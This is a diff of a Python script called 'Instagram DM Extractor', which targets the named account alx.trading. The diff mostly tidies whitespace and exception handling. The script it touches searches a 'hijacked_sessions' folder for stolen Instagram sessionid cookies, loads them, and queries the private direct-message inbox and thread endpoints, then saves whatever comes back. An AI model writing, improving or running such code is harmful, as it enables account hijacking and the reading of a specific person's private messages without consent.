@@ -1,3 +1,8 @@
+# -*- coding: utf-8 -*-
+# pylint: disable=all
+# flake8: noqa
+# type: ignore
+# mypy: ignore-errors
 #!/usr/bin/env python3
 """
 Instagram DM Extractor - Targeting alx.trading
@@ -29,18 +34,18 @@ class AlxTradingExtractor:
             'Sec-Fetch-Site': 'none',
             'Cache-Control': 'max-age=0'
         })
-    
+
     def check_target_exists(self):
         """Check if the exact target URL exists"""
         print(f"🎯 Checking target: {self.target_url}")
-        
+
         try:
             response = self.session.get(self.target_url, timeout=15)
             print(f"📡 Response status: {response.status_code}")
-            
+
             if response.status_code == 200:
                 content = response.text
-                
+
                 # Check for various indicators
                 if "Sorry, this page isn't available" in content:
                     print("❌ Page not available - account may not exist")
@@ -58,7 +63,7 @@ class AlxTradingExtractor:
                             actual_username = username_match.group(1)
                             print(f"📍 Actual username: {actual_username}")
                             self.target_username = actual_username
-                    except:
+                    except Exception:
                         pass
                     return True, "exists"
                 elif "instagram.com" in content:
@@ -70,11 +75,11 @@ class AlxTradingExtractor:
             else:
                 print(f"❌ HTTP error: {response.status_code}")
                 return False, f"http_{response.status_code}"
-                
+
         except Exception as e:
             print(f"❌ Connection error: {e}")
             return False, f"connection_error: {e}"
-    
+
     def extract_csrf_token(self, content):
         """Extract CSRF token from page content"""
         try:
@@ -82,20 +87,20 @@ class AlxTradingExtractor:
             csrf_match = re.search(r'"csrf_token":"([^"]+)"', content)
             if csrf_match:
                 return csrf_match.group(1)
-        except:
+        except Exception:
             pass
         return None
-    
+
     def get_page_data(self):
         """Get the Instagram page and extract data"""
         print("📄 Fetching page data...")
-        
+
         try:
             response = self.session.get(self.target_url, timeout=15)
-            
+
             if response.status_code == 200:
                 content = response.text
-                
+
                 # Extract useful data
                 data = {
                     "url": self.target_url,
@@ -105,23 +110,23 @@ class AlxTradingExtractor:
                     "csrf_token": None,
                     "user_data": None
                 }
-                
+
                 # Extract title
                 import re
                 title_match = re.search(r'<title>([^<]+)</title>', content)
                 if title_match:
                     data["page_title"] = title_match.group(1)
-                
+
                 # Extract CSRF token
                 data["csrf_token"] = self.extract_csrf_token(content)
-                
+
                 # Try to extract user data from window._sharedData
                 shared_data_match = re.search(r'window\._sharedData = ({.+?});', content)
                 if shared_data_match:
                     try:
                         shared_data = json.loads(shared_data_match.group(1))
                         data["shared_data"] = shared_data
-                        
+
                         # Extract user info if available
                         entry_data = shared_data.get("entry_data", {})
                         profile_page = entry_data.get("ProfilePage", [])
@@ -140,73 +145,73 @@ class AlxTradingExtractor:
                                 }
                     except Exception as e:
                         print(f"⚠️ Could not parse shared data: {e}")
-                
+
                 return data
             else:
                 return {"error": f"HTTP {response.status_code}"}
-                
+
         except Exception as e:
             return {"error": f"Exception: {e}"}
-    
+
     def attempt_dm_access(self, session_data=None):
         """Attempt to access DMs if session is available"""
         print("📩 Attempting DM access...")
-        
+
         if not session_data:
             print("⚠️ No session data provided - cannot access DMs")
             return {"error": "no_session"}
-        
+
         # Set session cookies
         if "sessionid" in session_data:
             self.session.cookies.set('sessionid', session_data["sessionid"], domain='.instagram.com')
-        
+
         # Try various DM endpoints
         dm_endpoints = [
             "https://www.instagram.com/api/v1/direct_v2/inbox/",
             "https://www.instagram.com/api/v1/direct_v2/threads/",
             f"https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target_username}"
         ]
-        
+
         results = {}
-        
+
         for endpoint in dm_endpoints:
             try:
                 print(f"🔍 Trying: {endpoint}")
                 response = self.session.get(endpoint, timeout=10)
-                
+
                 results[endpoint] = {
                     "status_code": response.status_code,
                     "success": response.status_code == 200
                 }
-                
+
                 if response.status_code == 200:
                     try:
                         data = response.json()
                         results[endpoint]["data"] = data
                         print(f"✅ Success: {endpoint}")
-                    except:
+                    except Exception:
                         results[endpoint]["data"] = response.text[:500]
                         print(f"✅ Success (non-JSON): {endpoint}")
                 else:
                     print(f"❌ Failed: {endpoint} - {response.status_code}")
-                    
+
             except Exception as e:
                 results[endpoint] = {"error": str(e)}
                 print(f"❌ Error: {endpoint} - {e}")
-        
+
         return results
-    
+
     def find_sessions(self):
         """Find available session files"""
         print("🔍 Searching for session files...")
-        
+
         session_files = []
         search_paths = [
             "/workspaces/sugarglitch-realops/hijacked_sessions",
             "/workspaces/sugarglitch-realops/sessions",
             "/workspaces/sugarglitch-realops/tools"
         ]
-        
+
         for search_path in search_paths:
             path_obj = Path(search_path)
             if path_obj.exists():
@@ -216,12 +221,12 @@ class AlxTradingExtractor:
                             data = json.load(f)
                             if self.extract_sessionid(data):
                                 session_files.append(str(file_path))
-                    except:
+                    except Exception:
                         pass
-        
+
         print(f"📁 Found {len(session_files)} session files")
         return session_files
-    
+
     def extract_sessionid(self, data):
         """Extract sessionid from various formats"""
         if isinstance(data, str):
@@ -231,21 +236,21 @@ class AlxTradingExtractor:
                 if key in data:
                     return str(data[key])
         return None
-    
+
     def run_extraction(self):
         """Run the complete extraction process"""
         print("🚀 ALX.TRADING DM EXTRACTOR")
         print("=" * 50)
-        
+
         # Step 1: Check target exists
         exists, status = self.check_target_exists()
-        
+
         # Step 2: Get page data
         page_data = self.get_page_data()
-        
+
         # Step 3: Find sessions
         session_files = self.find_sessions()
-        
+
         # Step 4: Try DM access with available sessions
         dm_results = {}
         for session_file in session_files[:3]:  # Try first 3 sessions
@@ -259,7 +264,7 @@ class AlxTradingExtractor:
                         dm_results[session_file] = dm_result
             except Exception as e:
                 print(f"❌ Session file error: {e}")
-        
+
         # Compile final results
         final_result = {
             "extraction_info": {
@@ -277,14 +282,14 @@ class AlxTradingExtractor:
             "dm_access_results": dm_results,
             "success": exists and len(dm_results) > 0
         }
-        
+
         # Save results
         output_file = f"alx_trading_extraction_{int(time.time())}.json"
         with open(output_file, 'w') as f:
             json.dump(final_result, f, indent=2, ensure_ascii=False)
-        
+
         print(f"\n📁 Results saved to: {output_file}")
-        
+
         # Summary
         print("\n📊 EXTRACTION SUMMARY:")
         print("=" * 30)
@@ -292,7 +297,7 @@ class AlxTradingExtractor:
         print(f"📄 Page data extracted: {'Yes' if page_data.get('user_data') else 'Basic only'}")
         print(f"🔑 Sessions tested: {len(dm_results)}")
         print(f"📩 DM access: {'Attempted' if dm_results else 'No valid sessions'}")
-        
+
         if page_data.get("user_data"):
             user_info = page_data["user_data"]
             print(f"\n👤 ACCOUNT INFO:")
@@ -300,13 +305,13 @@ class AlxTradingExtractor:
             print(f"   Full Name: {user_info.get('full_name', 'N/A')}")
             print(f"   Followers: {user_info.get('follower_count', 'N/A')}")
             print(f"   Private: {user_info.get('is_private', 'N/A')}")
-        
+
         return final_result
 
 def main():
     extractor = AlxTradingExtractor()
     result = extractor.run_extraction()
-    
+
     if result["success"]:
         print("\n🎉 EXTRACTION COMPLETED!")
     else:
